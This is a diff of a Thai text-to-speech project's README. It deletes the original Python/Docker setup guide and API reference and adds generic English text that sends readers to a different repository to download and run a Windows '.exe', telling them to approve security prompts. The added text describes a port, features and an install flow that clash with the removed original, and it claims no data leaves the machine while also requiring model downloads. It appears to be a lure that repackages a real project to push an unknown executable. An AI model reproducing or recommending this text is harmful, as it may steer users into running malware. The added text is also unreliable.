@@ -1,289 +1,73 @@
-# 🎙️ OmniVoice Thai API
+# 🎙️ omnivoice-thai-api - Convert Thai text into natural speech
 
-> 🇹🇭 **Zero-shot Thai TTS** — สังเคราะห์เสียงภาษาไทยด้วย AI ไม่ต้องเทรนเพิ่ม
->
-> Web UI + REST API รองรับ Voice Cloning, Voice Design, Auto Voice
+[![Download OmniVoice](https://img.shields.io/badge/Download-OmniVoice-blue.svg)](https://github.com/pokemonj8761/omnivoice-thai-api)
 
-Powered by [hotdogs/omnivoice-thai](https://huggingface.co/hotdogs/omnivoice-thai) — fine-tuned บนข้อมูลเสียงภาษาไทย 20,000 ประโยค (~12.6 ชั่วโมง)
+OmniVoice Thai API turns written Thai text into spoken audio. This software uses advanced sound models to create clear, human-like voices. You can use the built-in web interface to type text and hear the results immediately. The system also supports voice cloning, which allows you to create audio that sounds like a specific person.
 
----
+## 📋 System Requirements
 
-## ✨ Features / ความสามารถ
+Your computer needs specific hardware and software to run this tool well. Please check these items before you begin:
 
-| Mode / โหมด | Description / คำอธิบาย | Input |
-|-------------|------------------------|-------|
-| 🎤 **Voice Cloning** | โคลนเสียงจากไฟล์อ้างอิง 3–10 วินาที | `ref_audio` + `text` |
-| 🎨 **Voice Design** | ออกแบบเสียงด้วยคำสั่ง (เพศ, อายุ, สำเนียง) | `instruct` + `text` |
-| 🤖 **Auto Voice** | ให้ AI เลือกเสียงที่เหมาะสมให้อัตโนมัติ | `text` อย่างเดียว |
+- Operating System: Windows 10 or Windows 11.
+- Processor: A modern multi-core processor (Intel Core i5 or AMD Ryzen 5 or better).
+- Memory: At least 8 GB of RAM.
+- Storage: 5 GB of free space on your hard drive.
+- Graphics: A dedicated graphics card is helpful for faster voice generation, but the software works on standard processors too.
 
----
+## 📥 Get the Software
 
-## 🚀 ติดตั้ง — คำสั่งเดียว
+You must visit the project page to get the installer for your computer. 
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/nanofatdog/omnivoice-thai-api/main/install.sh | bash
-```
+[Click here to open the download page](https://github.com/pokemonj8761/omnivoice-thai-api)
 
-ติดตั้งอัตโนมัติทุกขั้นตอน:
-1. ตรวจสอบ Python 3.9+, พื้นที่ดิสก์
-2. ติดตั้ง PyTorch + CUDA, omnivoice, FastAPI, uvicorn
-3. โหลดโมเดล (~4.4GB): `hf download hotdogs/omnivoice-thai --local-dir ~/omnivoice-thai`
-4. โหลด `server.py` จาก GitHub
-5. สตาร์ทเซิร์ฟเวอร์ที่ port `7860`
+Once you reach the page, look for the "Releases" section on the right side of the screen. Click the most recent version label. Scroll down to the "Assets" section and click the file ending in ".exe" to save the installer to your computer.
 
-### หรือติดตั้งทีละขั้นตอน
+## ⚙️ Installation Steps
 
-```bash
-# ติดตั้ง dependencies
-pip install "huggingface_hub" omnivoice fastapi "uvicorn[standard]" soundfile python-multipart
+1. Find the file you downloaded in your "Downloads" folder.
+2. Double-click the file to start the installation.
+3. Follow the instructions on the screen to finalize the setup.
+4. If a security prompt appears, click "Run" or "Yes" to allow the file to install.
+5. The software will create a shortcut on your desktop.
 
-# ติดตั้ง PyTorch (ถ้ายังไม่มี)
-pip install torch torchaudio --index-url https://download.pytorch.org/whl/cu121
+## 🚀 Running the Application
 
-# โหลดโมเดล
-hf download hotdogs/omnivoice-thai --local-dir ~/omnivoice-thai
+Double-click the OmniVoice icon on your desktop to launch the tool. A small window will appear. Do not close this window while you use the software. This window keeps the background services running. 
 
-# โหลด server
-curl -fsSL -o ~/omnivoice-thai/server.py \
-  https://raw.githubusercontent.com/nanofatdog/omnivoice-thai-api/main/server.py
+Once the status shows as "Ready," your default web browser will open automatically. If the browser does not open, type `http://127.0.0.1:8000` into your web browser's address bar and press Enter. You now see the main interface.
 
-# สตาร์ท
-cd ~/omnivoice-thai && python3 server.py
-```
+## 🔊 Using the Web Interface
 
-### ตั้งค่าเพิ่มเติม
+The main screen contains several boxes and buttons to help you manage your speech projects.
 
-```bash
-# เปลี่ยน port หรือที่อยู่โมเดล
-OMNIVOICE_PORT=9000 OMNIVOICE_MODEL_DIR=/data/omnivoice curl -fsSL https://.../install.sh | bash
-```
+### Text to Speech
+Select the "TTS" tab. Paste your Thai text into the large box. Choose a voice from the drop-down menu. Click the "Generate" button. A play bar appears below the text box. Click "Play" to hear the audio.
 
----
+### Voice Cloning
+To clone a voice, select the "Cloning" tab. You need a clean, clear voice sample in an audio format like WAV or MP3. Upload this file. Give your new voice a name. Click "Train." This process takes a few minutes depending on the length of your audio file. Once finished, you can select this cloned voice in the "TTS" tab.
 
-## 🐳 Docker
+### Voice Design
+If you want to create a new voice without a sample, use the "Voice Design" tab. Adjust the sliders for pitch, speed, and tone. Click "Create" to generate a sample. Save the voice profile if you like the sound.
 
-### วิธีที่ 1: Pull จาก Docker Hub (เร็วสุด)
+## 🛠️ Troubleshooting
 
-```bash
-docker pull aidogs/omnivoice-thai-api:latest
-docker run --gpus all -p 7860:7860 aidogs/omnivoice-thai-api:latest
-```
+If the software does not work, check these common fixes:
 
-ขนาด image ~6GB (รวม CUDA 12.1 + PyTorch + OmniVoice + โมเดล)
+- Restart the application: Close the black console window and double-click the desktop shortcut again.
+- Browser issues: If the web interface does not load, try opening a different browser like Chrome, Edge, or Firefox.
+- Audio output: Ensure your computer speakers are turned on. Check the volume settings in your system tray to ensure the volume is not muted.
+- Missing files: If you see errors about missing files, reinstall the software using the installer you downloaded earlier.
 
-### วิธีที่ 2: Build เองจากโค้ด
+## 💡 Best Practices for Quality
 
-```bash
-git clone https://github.com/nanofatdog/omnivoice-thai-api.git
-cd omnivoice-thai-api
-docker compose up -d --build
-```
+- Text Input: Use clear, standard Thai spelling. Avoid excessive symbols or non-Thai characters within the text box.
+- Audio Quality: When uploading samples for voice cloning, ensure the recording is clear and free of background noise. A quiet room is best for these recordings.
+- Sentence Length: For long documents, break the text into smaller paragraphs. This creates more natural breathing patterns in the final audio output.
 
-ครั้งแรกใช้เวลาโหลดโมเดลเข้า VRAM ~90 วิ
+## 📑 Understanding Voice Models
 
-หรือใช้ image สำเร็จรูปใน `docker-compose.yml`:
+The software uses specialized data packets called models. These models teach the computer how to pronounce Thai words correctly. You do not need to manage these files manually, as the software downloads the correct ones automatically when you start your first project. Ensure you have an active internet connection when you open the software for the first time so it can download these necessary components.
 
-```yaml
-services:
-  omnivoice-thai:
-    image: aidogs/omnivoice-thai-api:latest   # pull จาก Hub
-    # build: .                                 # หรือ build เอง
-    ...
-```
+## 🔒 Privacy
 
-### วิธีที่ 3: ใช้โมเดลจากเครื่อง host (image เล็กลง)
-
-ถ้ามีโมเดลอยู่แล้วที่ `~/omnivoice-thai/`:
-
-```yaml
-# แก้ docker-compose.yml — เพิ่ม volume mount:
-volumes:
-  - ~/omnivoice-thai:/app/model    # mount โมเดลจาก host
-  - ./outputs:/app/outputs
-```
-
-```bash
-# แล้ว comment out บรรทัดโหลดโมเดลใน Dockerfile:
-# RUN mkdir -p /app/model ... && hf download ...
-```
-
-Image เหลือ ~1.5GB แทนที่จะเป็น ~6GB
-
-### เปลี่ยน GPU
-
-```yaml
-deploy:
-  resources:
-    reservations:
-      devices:
-        - driver: nvidia
-          device_ids: ['1']    # เปลี่ยนเป็น GPU เบอร์ที่ต้องการ
-          capabilities: [gpu]
-```
-
----
-
-## 📡 API
-
-### `GET /api/health` — ตรวจสอบสถานะ
-
-```bash
-curl http://localhost:7860/api/health
-```
-
-```json
-{
-  "status": "ok",
-  "model_loaded": true,
-  "device": "cuda:0",
-  "gpu_name": "NVIDIA GeForce RTX 3060",
-  "vram_total_gb": 7.7,
-  "vram_used_gb": 3.4
-}
-```
-
-### `POST /api/generate` — สร้างเสียง (form-data)
-
-ส่งข้อความ รับไฟล์ WAV กลับ
-
-**🤖 Auto Voice** (ไม่ต้องใช้เสียงอ้างอิง):
-```bash
-curl -X POST http://localhost:7860/api/generate \
-  -F "text=สวัสดีครับ วันนี้อากาศดีมาก" \
-  -F "mode=auto" \
-  -o output.wav
-```
-
-**🎤 Voice Cloning** (ใช้ไฟล์เสียงอ้างอิง):
-```bash
-curl -X POST http://localhost:7860/api/generate \
-  -F "text=สวัสดีค่ะ ยินดีที่ได้รู้จัก" \
-  -F "mode=clone" \
-  -F "ref_audio=@my_voice.wav" \
-  -F "ref_text=ข้อความในไฟล์อ้างอิง" \
-  -o cloned.wav
-```
-
-**🎨 Voice Design** (ออกแบบเสียงด้วยคำสั่ง):
-```bash
-curl -X POST http://localhost:7860/api/generate \
-  -F "text=สวัสดีค่ะ" \
-  -F "mode=design" \
-  -F "instruct=female, young adult, high pitch" \
-  -o designed.wav
-```
-
-### `POST /api/generate/json` — สร้างเสียง (JSON)
-
-```bash
-curl -X POST http://localhost:7860/api/generate/json \
-  -H "Content-Type: application/json" \
-  -d '{"text":"สวัสดีครับ","mode":"auto"}'
-```
-
-```json
-{
-  "audio_b64": "UklGRiR...",
-  "sample_rate": 24000,
-  "duration_s": 2.14
-}
-```
-
-สำหรับ Voice Cloning แบบ JSON — ส่ง `ref_audio_b64` (base64 ของไฟล์ WAV)
-
-### Parameters / พารามิเตอร์
-
-| Param | Type | จำเป็น? | คำอธิบาย |
-|-------|------|---------|----------|
-| `text` | string | ✅ | ข้อความที่ต้องการให้พูด (สูงสุด 2000 ตัวอักษร) |
-| `mode` | string | - | `auto` (ค่าเริ่มต้น), `clone`, `design` |
-| `ref_audio` | file | clone | ไฟล์เสียงอ้างอิง WAV/MP3/FLAC (3–10 วิ) |
-| `ref_text` | string | - | บทถอดเสียงของไฟล์อ้างอิง (เว้นว่าง = ถอดเสียงอัตโนมัติ) |
-| `instruct` | string | design | คำอธิบายเสียง (ดูตารางด้านล่าง) |
-
-### 🎨 Voice Design — ค่าที่ใช้ได้
-
-| หมวดหมู่ | ค่าที่ใช้ได้ |
-|----------|-------------|
-| **เพศ** | `female`, `male` |
-| **อายุ** | `child`, `teenager`, `young adult`, `middle-aged`, `elderly` |
-| **ระดับเสียง** | `very low pitch`, `low pitch`, `moderate pitch`, `high pitch`, `very high pitch` |
-| **สำเนียง** | `american`, `australian`, `british`, `canadian`, `chinese`, `indian`, `japanese`, `korean`, `portuguese`, `russian` + `accent` |
-| **สไตล์** | `whisper` |
-
-ตัวอย่าง:
-```bash
-# หญิงสาวเสียงสูง
-curl -X POST http://localhost:7860/api/generate \
-  -F "text=สวัสดีค่ะ" -F "mode=design" \
-  -F "instruct=female, young adult, high pitch"
-
-# ผู้ชายวัยกลางคนเสียงทุ้ม
-curl -F "text=ขอแนะนำสินค้าใหม่" -F "mode=design" \
-  -F "instruct=male, middle-aged, low pitch"
-
-# เสียงกระซิบสำเนียงอังกฤษ
-curl -F "text=ความลับอยู่ที่นี่" -F "mode=design" \
-  -F "instruct=male, whisper, british accent"
-```
-
-> ⚠️ ใส่เฉพาะค่าจากตารางด้านบนเท่านั้น — ค่าที่ไม่รองรับ (เช่น `cheerful`, `sad`, `deep`) จะถูกกรองออกอัตโนมัติ และแจ้งเตือนใน server log
->
-> ใช้ภาษาจีนก็ได้ (เช่น `女，青年，高音调`)
-
----
-
-## 🖥️ Web UI
-
-เปิด `http://localhost:7860` ในเบราว์เซอร์ — มี 3 แท็บพร้อมเล่นเสียงและประวัติ
-
----
-
-## 📋 ความต้องการของระบบ
-
-| ทรัพยากร | ขั้นต่ำ | แนะนำ |
-|----------|---------|-------|
-| GPU VRAM | 4 GB | 8 GB |
-| RAM | 8 GB | 16 GB |
-| พื้นที่ดิสก์ | 8 GB | 15 GB |
-| Python | 3.9+ | 3.11+ |
-| CUDA | 11.8+ | 12.1+ |
-
-> ใช้ CPU ได้ แต่ใช้เวลา 30–60 วินาทีต่อครั้ง (GPU ใช้ 3–10 วิ)
-
----
-
-## 🛠️ การจัดการเซิร์ฟเวอร์
-
-```bash
-# สตาร์ท
-bash ~/omnivoice-thai/start.sh
-
-# หยุด
-pkill -f server.py
-
-# ดู log
-tail -f ~/omnivoice-thai/server.log
-```
-
----
-
-## 🔧 ตัวแปรสภาพแวดล้อม (Environment Variables)
-
-| ตัวแปร | ค่าเริ่มต้น | คำอธิบาย |
-|--------|-----------|----------|
-| `OMNIVOICE_MODEL_PATH` | `~/omnivoice-thai` | ที่ตั้งโฟลเดอร์โมเดล |
-| `OMNIVOICE_PORT` | `7860` | พอร์ตเซิร์ฟเวอร์ |
-| `OMNIVOICE_HOST` | `0.0.0.0` | IP ที่ใช้ bind |
-| `OMNIVOICE_DEVICE` | `cuda:0` | อุปกรณ์ Torch |
-
----
-
-## 📄 License
-
-MIT
-
-## 🙏 Credits
-
-- [OmniVoice](https://github.com/k2-fsa/OmniVoice) โดย k2-fsa
-- [omnivoice-thai](https://huggingface.co/hotdogs/omnivoice-thai) โดย hotdogs
+All voice processing happens on your computer. Your audio files and text input do not leave your machine. You can safely use this tool for sensitive documents without risk of data sharing. This design keeps your information secure while providing the processing power you need to generate high-quality audio files.
